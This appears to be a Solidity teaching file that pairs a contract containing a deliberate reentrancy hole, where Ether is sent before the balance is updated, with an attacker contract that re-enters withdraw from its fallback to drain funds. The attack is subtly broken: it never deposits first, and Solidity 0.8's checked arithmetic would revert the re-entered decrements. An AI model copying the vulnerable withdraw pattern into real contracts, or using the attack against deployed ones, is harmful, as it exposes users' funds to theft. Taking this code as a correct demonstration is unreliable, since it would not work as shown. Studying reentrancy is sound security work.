pragma solidity "0.8.0";

contract VulnerableContract {
    mapping(address => uint256) private balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "Insufficient balance");

        // Vulnerability: The external contract is called before updating the balance
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount;
    }
}

contract AttackContract {
    VulnerableContract private vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    function attack() public payable {
        vulnerableContract.withdraw(msg.value);
    }

    // Fallback function to receive Ether
    fallback() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw(msg.value);
        }
    }
}
